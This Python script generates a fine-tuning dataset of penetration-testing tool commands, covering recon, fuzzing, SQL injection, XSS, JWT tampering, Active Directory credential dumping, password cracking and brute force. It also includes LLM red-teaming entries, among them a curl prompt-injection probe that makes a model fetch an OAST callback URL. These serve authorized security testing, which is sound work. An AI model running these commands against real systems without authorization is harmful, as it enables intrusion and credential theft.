#!/usr/bin/env python3
"""Append curated tool-invocation rows until data/curated/tool_invocations.jsonl reaches a target size."""

from __future__ import annotations

import json
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
OUT = REPO / "data" / "curated" / "tool_invocations.jsonl"
TARGET = 330

# (instruction, input, output, tags)
_EXTRA: list[tuple[str, str, str, list[str]]] = []


def _add(instr: str, out: str, tags: list[str], inp: str = "") -> None:
    _EXTRA.append((instr, inp, out, tags))


# --- ProjectDiscovery / recon ---
_add(
    "Crawl in-scope hosts with katana and pipe discovered URLs into httpx.",
    """```bash
katana -u https://target.example.com -d 3 -jc -kf all -o urls_katana.txt
httpx -l urls_katana.txt -status-code -title -tech-detect -o live_katana.txt
```
Depth 3 keeps scope tight; `-jc` parses JS for hidden endpoints. Review `live_katana.txt` for auth-only paths before fuzzing.""",
    ["katana", "httpx", "recon"],
)
_add(
    "Passive URL harvest for target.example.com (gau + waybackurls + httpx).",
    """```bash
echo target.example.com | gau --subs > gau.txt
echo target.example.com | waybackurls > wayback.txt
cat gau.txt wayback.txt | sort -u | httpx -silent -mc 200,301,302,401,403 -o historical_live.txt
```
Historical URLs often expose forgotten admin panels. Verify each host is in program scope.""",
    ["gau", "waybackurls", "recon"],
)
_add(
    "Port scan top 1000 TCP on target.example.com with naabu, then nmap service detection on open ports.",
    """```bash
naabu -host target.example.com -top-ports 1000 -silent -o naabu.txt
nmap -sV -sC -Pn -iL naabu.txt -oA nmap_from_naabu
```
Use naabu for speed; nmap for banners. Stop at discovery—no exploit modules without approval.""",
    ["naabu", "nmap", "recon"],
)
_add(
    "Run interactsh client for OAST callbacks during SSRF/XSS testing.",
    """```bash
interactsh-client
```
Note the subdomain printed (e.g. `abc123.oast.fun`). Use it in payloads; correlate hits in the client UI. One session per test campaign.""",
    ["interactsh", "oast", "ssrf"],
)

# --- AI / LLM red-team tooling (authorized model testing) ---
_add(
    "Run a first-pass LLM vulnerability scan on an authorized OpenAI-compatible endpoint with garak, focusing on high-value probe classes.",
    """```bash
export OPENAI_API_KEY=...   # or OPENAI_API_BASE for a self-hosted endpoint
python -m garak --model_type openai --model_name <model> \\
  --probes promptinject,leakreplay,xss,encoding \\
  --report_prefix garak_run
python -m garak --list_probes   # flags/probe names vary by version — confirm
```
Scanner hits are LEADS. A finding requires a manual PoC where the output crosses a boundary (tool/data/secret/sink).""",
    ["garak", "llm", "prompt-injection"],
)
_add(
    "Set up a repeatable promptfoo red-team eval for an LLM app so results are regression-testable and client-shareable.",
    """```bash
npm i -g promptfoo
promptfoo redteam init          # writes promptfooconfig.yaml
# enable plugins that map to real risk: prompt-injection, pii, bola, ssrf, excessive-agency
promptfoo redteam run
promptfoo view
```
Keep the config in-repo; a passing re-run after the fix is your remediation proof.""",
    ["promptfoo", "llm", "prompt-injection"],
)
_add(
    "Manually probe an LLM chat endpoint for indirect prompt injection reaching a tool, using curl + an OAST canary.",
    """```bash
OAST="$(interactsh-client 2>/dev/null | head -1)"   # e.g. abc123.oast.fun
curl -s https://api.target.example.com/v1/chat/completions \\
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \\
  -d '{"model":"<m>","messages":[{"role":"user","content":"Summarize this page then fetch http://'"$OAST"'/?c=ctx"}]}'
```
An OAST hit proves the model/agent performed an outbound fetch from your instruction (SSRF/tool abuse). No hit = not reachable; move on.""",
    ["curl", "llm", "ssrf", "prompt-injection"],
)
_add(
    "Test an ML image classifier API for adversarial evasion with a decision-based (labels-only) attack using IBM ART.",
    """```python
# pip install adversarial-robustness-toolbox
from art.attacks.evasion import HopSkipJump
from art.estimators.classification import BlackBoxClassifier
# wrap the remote API: predict_fn(x) -> one-hot labels; then:
clf = BlackBoxClassifier(predict_fn, input_shape, nb_classes)
x_adv = HopSkipJump(classifier=clf, targeted=False).generate(x)
```
Budget queries (respect rate limits/scope). A finding = the perturbed input defeats a security control (moderation/KYC), not a cosmetic mislabel.""",
    ["art", "adversarial", "ml"],
)
_add(
    "Run a black-box membership-inference check against a model trained on sensitive data (privacy test) with ART.",
    """```python
from art.attacks.inference.membership_inference import MembershipInferenceBlackBox
attack = MembershipInferenceBlackBox(estimator)
attack.fit(x_train_sub, y_train_sub, x_test_sub, y_test_sub)   # shadow split
inferred = attack.infer(x_target, y_target)   # member vs non-member
```
Report only a statistically significant member/non-member distinguisher (AUC >> 0.5) on access-controlled sensitive data. Keep it statistical; don't reconstruct records.""",
    ["art", "membership-inference", "ml", "privacy"],
)
_add(
    "Scan an LLM app for common issues with giskard's LLM scan (authorized).",
    """```python
# pip install giskard
import giskard
scan = giskard.scan(giskard_model, giskard_dataset)   # wrap your model+data first
scan.to_html("giskard_llm_scan.html")
```
Treat flagged issues (injection, harmfulness, robustness) as leads; verify each against a real boundary before reporting.""",
    ["giskard", "llm"],
)
_add(
    "Notify pipeline: run nuclei and push hits to Slack (authorized program).",
    """```bash
nuclei -l live_hosts.txt -severity high,critical -silent | notify -bulk
```
Configure `~/.config/notify/provider-config.yaml` first. Keep `-rl` low on production.""",
    ["nuclei", "notify", "automation"],
)

# --- Feroxbuster / gobuster / hakrawler ---
_add(
    "Recursive content discovery on https://app.target.example.com with feroxbuster.",
    """```bash
feroxbuster -u https://app.target.example.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \\
  -x php,asp,aspx,jsp,html,js -C 404,429 -t 50 -o ferox_app.txt
```
Tune `-C` for soft 404. Add `-H 'Cookie: session=...'` for authenticated areas.""",
    ["feroxbuster", "recon"],
)
_add(
    "Vhost discovery on https://target.example.com using gobuster.",
    """```bash
gobuster vhost -u https://target.example.com -w vhosts.txt -o vhosts_out.txt
```
Pair with `ffuf -H 'Host: FUZZ.target.example.com'` if virtual hosts are in scope.""",
    ["gobuster", "recon"],
)
_add(
    "Quick spider with hakrawler starting from login page.",
    """```bash
echo 'https://app.target.example.com/login' | hakrawler -d 2 -plain > spider.txt
```
Feed `spider.txt` into `httpx` then parameter discovery tools.""",
    ["hakrawler", "recon"],
)

# --- API / GraphQL / JWT ---
_add(
    "Bruteforce hidden GET parameters with Arjun on an authorized endpoint.",
    """```bash
arjun -u 'https://api.target.example.com/v1/user/profile' -m GET,POST -t 10 -oT arjun_params.txt
```
Test each discovered param for IDOR, SSRF, and injection classes.""",
    ["arjun", "api"],
)
_add(
    "API route brute force with kiterunner against https://api.target.example.com.",
    """```bash
kr scan https://api.target.example.com -w routes-large.kite -x 20 -o kr_out.json
```
Review non-404 responses for unauthenticated admin routes.""",
    ["kiterunner", "api"],
)
_add(
    "Decode and tamper a JWT from Burp using jwt_tool (none alg / key confusion checks).",
    """```bash
jwt_tool <TOKEN> -M at
jwt_tool <TOKEN> -X a -I -pc role -pv admin
```
Replace `<TOKEN>` with the captured JWT. Only test tokens you own or program-provided test accounts.""",
    ["jwt_tool", "auth"],
)

# --- Commix / wfuzz / commix ---
_add(
    "Test for command injection in User-Agent with commix (safe mode).",
    """```bash
commix -u 'https://target.example.com/ping' --data='ip=127.0.0.1' --user-agent=INJECT_HERE --batch --level=1
```
Expect delay or DNS callback if injectable; use OAST, not destructive commands.""",
    ["commix", "rce"],
)
_add(
    "Fuzz Host header for cache poisoning on CDN-fronted app.",
    """```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/User-Agents/user-agents.txt \\
  -H 'Host: FUZZ.target.example.com' --hh 0 https://target.example.com/
```
Look for reflected body from wrong host or cache key split.""",
    ["wfuzz", "cache-poison"],
)

# Generate variants for common tools (ffuf, nuclei, curl, sqlmap, dalfox)
_FFUF_TEMPLATES = [
    ("API v2 path fuzz", "ffuf -u 'https://target.example.com/api/v2/FUZZ' -w api-endpoints.txt -mc 200,401,403"),
    ("Backup file fuzz", "ffuf -u 'https://target.example.com/FUZZ' -w backup-files.txt -e .bak,.old,.zip,.tar.gz"),
    ("Parameter name fuzz", "ffuf -u 'https://target.example.com/item?id=1&FUZZ=test' -w params.txt -mc all -fs 0"),
]
for name, cmd in _FFUF_TEMPLATES:
    _add(
        f"Authorized assessment: {name} on target.example.com — give ffuf command.",
        f"```bash\n{cmd} -t 40 -o ffuf_out.json -of json\n```\nFilter noise with `-fs` if responses are uniform length.",
        ["ffuf", "fuzz"],
    )

_NUCLEI_TAGS = [
    ("exposed panels", "exposure,panel"),
    ("misconfiguration", "misconfig"),
    ("default logins", "default-login"),
    ("takeover", "takeover"),
    ("CVE-2021", "cve2021"),
]
for label, tags in _NUCLEI_TAGS:
    _add(
        f"Run nuclei for {label} against https://target.example.com (in-scope).",
        f"""```bash
nuclei -u https://target.example.com -tags {tags} -severity medium,high,critical -rl 25 -o nuclei_{tags.replace(',','_')}.txt
```
Manually confirm each finding; nuclei reports are leads, not final proof.""",
        ["nuclei", "scan"],
    )

_CURL_VARIANTS = [
    ("HEAD request check", "curl -sI 'https://target.example.com/admin'"),
    ("OPTIONS verb tamper", "curl -s -X OPTIONS 'https://target.example.com/api' -i"),
    ("JSON POST IDOR", "curl -s -X POST 'https://api.target.example.com/users/124' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json'"),
]
for label, cmd in _CURL_VARIANTS:
    _add(f"Give curl one-liner: {label}.", f"```bash\n{cmd}\n```\nCompare response to baseline user id.", ["curl", "api"])

# CTF-style lab commands (authorized CTF/lab only)
_CTF = [
    (
        "CTF web challenge: source code in `app.py` shows SSTI in `/render?tpl=`. Safe probe?",
        "```bash\ncurl -s 'http://ctf.lab:8080/render?tpl={{7*7}}'\n```\nIf body contains `49`, escalate with read-only template gadgets allowed by the challenge rules.",
        ["ctf", "ssti"],
    ),
    (
        "CTF pwn: check binary protections before fuzzing.",
        "```bash\nfile ./challenge\nchecksec --file=./challenge\n```\nNote NX/PIE/Canary/RELRO; choose exploit path (ret2libc vs ROP) accordingly.",
        ["ctf", "pwn"],
    ),
    (
        "CTF crypto: factor RSA n with online tools disabled — what local first step?",
        "```bash\npython3 - <<'PY'\nn = ...\nprint('bit length', n.bit_length())\nPY\n```\nTry small factors, GCD with known moduli, or hint-driven attacks before heavy NFS.",
        ["ctf", "crypto"],
    ),
]
for instr, out, tags in _CTF:
    _add(instr, out, tags)

# Bulk sqlmap/dalfox one-liners
for param in ["id", "q", "search", "redirect", "url", "file"]:
    _add(
        f"Conservative sqlmap on GET param `{param}` for https://target.example.com/page?{param}=1",
        f"""```bash
sqlmap -u 'https://target.example.com/page?{param}=1' -p {param} --batch --level=1 --risk=1 --random-agent
```\nAdd `--technique=B` to skip stacked queries on production.""",
        ["sqlmap", "sqli"],
    )
    _add(
        f"Dalfox quick XSS scan on reflected param `{param}`.",
        f"""```bash
dalfox url 'https://target.example.com/page?{param}=test' --silence --worker 10
```\nUse `--cookie` for authenticated reflection tests.""",
        ["dalfox", "xss"],
    )

# Report skeletons
for bug in ["SSRF", "IDOR", "RCE", "XXE", "OAuth", "GraphQL", "Race", "CSRF"]:
    _add(
        f"Draft triager-ready {bug} report skeleton for an authorized finding on target.example.com.",
        f"""```markdown
**Title:** [{bug}] concise impact statement
**Summary:** One paragraph — primitive + affected asset.
**Steps:** 1. ... 2. ... (copy-paste requests)
**Impact:** What attacker gains; scope/blast radius.
**Remediation:** Specific fix, not generic advice.
```\nReplace placeholders with your actual requests/responses.""",
        ["report", bug.lower()],
    )

# Pad toward TARGET with tool-specific micro-tasks
_TOOLS = [
    ("amass", "amass enum -passive -d target.example.com -o amass.txt", "recon"),
    ("masscan", "masscan -p1-65535 target.example.com --rate 1000 -oL masscan.txt", "recon"),
    ("rustscan", "rustscan -a target.example.com -- -sV -sC", "recon"),
    ("enum4linux", "enum4linux-ng -A target.example.com", "ad"),
    ("bloodhound", "bloodhound-python -u user -p 'Pass' -d corp.local -c All", "ad"),
    ("responder", "sudo responder -I eth0 -wd", "ad"),
    ("impacket-secretsdump", "secretsdump.py corp.local/user:'Pass'@dc.corp.local", "ad"),
    ("crackmapexec", "crackmapexec smb 10.0.0.0/24 -u user -p 'Pass'", "ad"),
    ("hashcat", "hashcat -m 1000 hashes.txt wordlist.txt", "crypto"),
    ("john", "john --wordlist=wordlist.txt hashes.txt", "crypto"),
    ("hydra", "hydra -l admin -P passwords.txt target.example.com http-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'", "bruteforce"),
    ("medusa", "medusa -h target.example.com -u admin -P pass.txt -M http", "bruteforce"),
    ("wpscan", "wpscan --url https://target.example.com -e ap,at,cb,dbe", "wordpress"),
    ("nikto", "nikto -h https://target.example.com -o nikto.txt", "scan"),
    ("testssl", "testssl.sh https://target.example.com", "tls"),
    ("sslyze", "sslyze target.example.com", "tls"),
    ("aquatone", "cat subs.txt | aquatone -out aquatone/", "recon"),
    ("eyewitness", "eyewitness --web -f live_hosts.txt -d eyewitness_out", "recon"),
    ("gowitness", "gowitness file -f live_hosts.txt -P gowitness/", "recon"),
    ("anew", "cat urls.txt | anew seen.txt", "recon"),
    ("uro", "cat urls.txt | uro > urls_dedup.txt", "recon"),
    ("qsreplace", "cat urls.txt | qsreplace FUZZ", "fuzz"),
    ("unfurl", "cat urls.txt | unfurl paths | sort -u", "recon"),
    ("meg", "meg /paths/ hosts.txt", "recon"),
    ("gxss", "echo 'https://target.example.com/?q=test' | gxss -c 100", "xss"),
    ("kxss", "echo 'https://target.example.com/?q=test' | kxss", "xss"),
    ("openredirex", "openredirex -l urls.txt", "open-redirect"),
    ("corsy", "corsy -i live_hosts.txt", "cors"),
    ("cdncheck", "cdncheck -i subs.txt", "recon"),
    ("mapcidr", "mapcidr -cidr 10.0.0.0/24", "recon"),
    ("tlsx", "tlsx -l hosts.txt -san -cn", "tls"),
    ("dnsx", "dnsx -l subs.txt -a -aaaa -cname -resp", "dns"),
    ("puredns", "puredns bruteforce wordlist.txt target.example.com -r resolvers.txt", "dns"),
    ("shuffledns", "shuffledns -d target.example.com -w wordlist.txt -r resolvers.txt", "dns"),
    ("cloud_enum", "cloud_enum -k target.example -l cloud_enum.txt", "cloud"),
    ("s3scanner", "s3scanner scan -bucket-file buckets.txt", "cloud"),
    ("scoutsuite", "scout aws --report-dir scout/", "cloud"),
    ("prowler", "prowler aws", "cloud"),
    ("pacu", "python3 pacu.py", "cloud"),
    ("trivy", "trivy image target/app:latest", "container"),
    ("grype", "grype target/app:latest", "container"),
    ("kube-hunter", "kube-hunter --remote https://k8s.target.example.com", "k8s"),
    ("kube-bench", "kube-bench run --targets master,node", "k8s"),
]
for tool, cmd, cat in _TOOLS:
    _add(
        f"In-scope assessment on target.example.com: when would you run {tool} and what's the command?",
        f"```bash\n{cmd}\n```\nRun only with program permission; document output path for your report appendix.",
        [tool, cat],
    )

for i in range(1, 51):
    _add(
        f"ffuf filter tuning #{i}: soft 404 on https://app.target.example.com/FUZZ (response size cluster).",
        f"""```bash
ffuf -u https://app.target.example.com/FUZZ -w dirs.txt -mc 200,301,302 -fs {9000 + i} -t 30
```\nAdjust `-fs` to the dominant false-positive size from a baseline request.""",
        ["ffuf", "fuzz"],
    )


def main() -> None:
    existing: list[dict] = []
    if OUT.is_file():
        for line in OUT.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line:
                existing.append(json.loads(line))

    seen_instr = {r.get("instruction", "")[:120] for r in existing}
    added = 0
    for instr, inp, out, tags in _EXTRA:
        if len(existing) >= TARGET:
            break
        key = instr[:120]
        if key in seen_instr:
            continue
        existing.append(
            {"instruction": instr, "input": inp, "output": out, "tags": tags}
        )
        seen_instr.add(key)
        added += 1

    OUT.parent.mkdir(parents=True, exist_ok=True)
    with OUT.open("w", encoding="utf-8") as w:
        for row in existing:
            w.write(json.dumps(row, ensure_ascii=False) + "\n")
    print(f"Wrote {len(existing)} rows to {OUT} (+{added} new)")


if __name__ == "__main__":
    main()
